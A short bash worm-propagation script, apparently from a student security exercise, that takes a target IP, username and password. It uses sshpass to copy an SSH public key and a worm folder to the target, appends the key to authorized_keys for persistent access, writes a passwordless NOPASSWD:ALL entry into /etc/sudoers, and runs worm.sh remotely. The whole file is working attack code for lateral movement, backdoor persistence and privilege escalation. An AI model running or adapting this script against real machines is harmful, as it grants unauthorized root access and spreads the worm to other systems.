#!/bin/bash
# ./ssh ip username userpasswd file_path
  
ssh-keygen
echo "1 scp"
sshpass -p $3 scp ~/.ssh/id_rsa.pub $2@$1:~/.ssh/ 
######### scp worm ########
echo "2 scp"
sshpass -p $3 scp -rp $4 $2@$1:~/Desktop/
echo "3 ssh"
sshpass -p $3 ssh $2@$1 << EOF
echo "1"
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
echo "2"
echo $3 | sudo -S bash -c "echo '$2  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
echo "3"
~/Desktop/0516243-0516318/worm.sh
EOF

